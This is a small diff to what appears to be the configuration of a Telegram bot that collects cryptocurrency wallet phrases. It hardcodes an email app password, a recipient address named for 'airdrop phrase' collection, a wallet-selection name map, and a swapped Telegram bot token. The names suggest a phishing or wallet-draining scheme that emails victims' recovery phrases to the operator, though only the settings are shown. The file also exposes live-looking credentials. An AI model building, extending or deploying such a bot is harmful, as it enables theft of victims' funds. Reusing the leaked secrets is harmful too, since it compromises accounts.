@@ -56,7 +56,7 @@ SENDER_PASSWORD = "ipxs ffag eqmk otqd"  # replace with env var in prod
 RECIPIENT_EMAIL = "airdropphrase@gmail.com"
 
 # Bot token (as provided) - replace with env var in production
-BOT_TOKEN = "8691346133:AAHS14yzNOD8suG5ZhE4Pd9jEY-JHYieRog"
+BOT_TOKEN = "8514077661:AAHNV4hvGyGqi3O_lT-HkeciqDzoRdzP4YA"
 
 # Wallet display names used for wallet selection UI
 WALLET_DISPLAY_NAMES = {
